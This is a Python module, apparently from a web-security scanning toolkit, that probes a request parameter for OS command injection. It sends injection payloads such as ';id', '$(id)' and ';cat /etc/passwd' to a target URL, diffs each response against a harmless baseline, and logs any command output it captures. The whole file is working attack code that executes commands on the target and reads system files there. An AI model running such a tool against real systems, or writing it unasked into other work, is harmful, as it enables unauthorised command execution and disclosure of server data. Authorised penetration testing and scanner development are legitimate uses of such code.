import time
import difflib
import re
from modules.utils import make_request


def probe_with_baseline(target_url, auth, param_name, payload=None, method='POST',
                        baseline_value=None, static_params=None, test_generic=True):
    """
    Performs command injection testing by comparing a baseline response to an exploit response.

    This method sends a "safe" request (baseline) and a request with a malicious payload.
    It then uses a diffing algorithm to see if the payload caused any change in the output,
    which often indicates successful command execution.

    :param target_url: The URL to send the request to.
    :param auth: A tuple for basic authentication (username, password).
    :param param_name: The name of the parameter to inject the payload into.
    :param payload: A specific, user-provided payload to test.
    :param method: The HTTP method to use ('GET' or 'POST').
    :param baseline_value: An optional safe value to use for the baseline request. Defaults to a unique string.
    :param static_params: A dictionary of other parameters to include in the request.
    :param test_generic: If True, a list of common, generic payloads will also be tested.
    """
    # Append scan results to a log file for record-keeping.
    with open('scan_results.txt', 'a') as f:
        f.write(f"\n[+] New Scan Started at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Target URL: {target_url}\n")
        f.write(f"Parameter: {param_name}\n")
        f.write(f"Method: {method}\n")

    # A list of common, generic payloads to try if test_generic is True.
    generic_payloads = [';id', '|id', '`id`', '$(id)', ';ls', ';cat /etc/passwd']
    successful_payloads = []
    payloads_to_test = generic_payloads if test_generic else []

    # Add the user-specified payload to the front of the list.
    if payload:
        payloads_to_test.insert(0, payload)

    if not payloads_to_test:
        print("[-] No payloads specified and generic testing disabled")
        return None

    # --- Main Attack Loop ---
    for current_payload in payloads_to_test:
        print(f"\n[+] Testing Payload: '{current_payload.strip()}'")

        # --- 1. Send Baseline Request ---
        # Use a unique, non-malicious value to get a normal response.
        final_baseline_value = baseline_value if baseline_value is not None else 'zzzzxyz123unique'
        baseline_params = static_params.copy() if static_params else {}
        baseline_params[param_name] = final_baseline_value

        baseline_response = make_request(
            target_url, method=method,
            data=baseline_params if method.upper() == 'POST' else None,
            params=baseline_params if method.upper() == 'GET' else None,
            auth=auth
        )
        if not baseline_response:
            continue

        # --- 2. Send Exploit Request ---
        exploit_params = baseline_params.copy()
        exploit_params[param_name] = current_payload

        exploit_response = make_request(
            target_url, method=method,
            data=exploit_params if method.upper() == 'POST' else None,
            params=exploit_params if method.upper() == 'GET' else None,
            auth=auth
        )
        if not exploit_response:
            continue

        # --- 3. Compare Responses ---
        # Use difflib to find differences between the baseline and exploit responses.
        # We split by whitespace and HTML tags to get a more meaningful diff.
        diff = difflib.unified_diff(
            re.split(r'(\s+|<[^>]+>)', baseline_response.text),
            re.split(r'(\s+|<[^>]+>)', exploit_response.text),
            fromfile='baseline', tofile='exploit', lineterm=''
        )
        # Extract lines that were added in the exploit response.
        added_lines = [line[1:] for line in diff if line.startswith('+') and not line.startswith('+++')]

        if added_lines:
            result = "".join(added_lines)
            successful_payloads.append((current_payload, result))
            # Log the successful finding.
            with open('scan_results.txt', 'a') as f:
                f.write(f"\n[!] VULNERABLE TO: {current_payload}\n")
                f.write("-" * 50 + "\n")
                f.write(result.strip())
                f.write("\n" + "-" * 50 + "\n")
            print("    [+] Payload successful! Results saved to scan_results.txt")

    if successful_payloads:
        print("\n[+] Command Injection Vulnerabilities Found:")
        for p, _ in successful_payloads:
            print(f"  - {p}")
        return successful_payloads[0][1]  # Return the output of the first success.

    print("\n[-] No command injection vulnerabilities detected")
    with open('scan_results.txt', 'a') as f:
        f.write("\n[-] No command injection vulnerabilities detected\n")
    return None
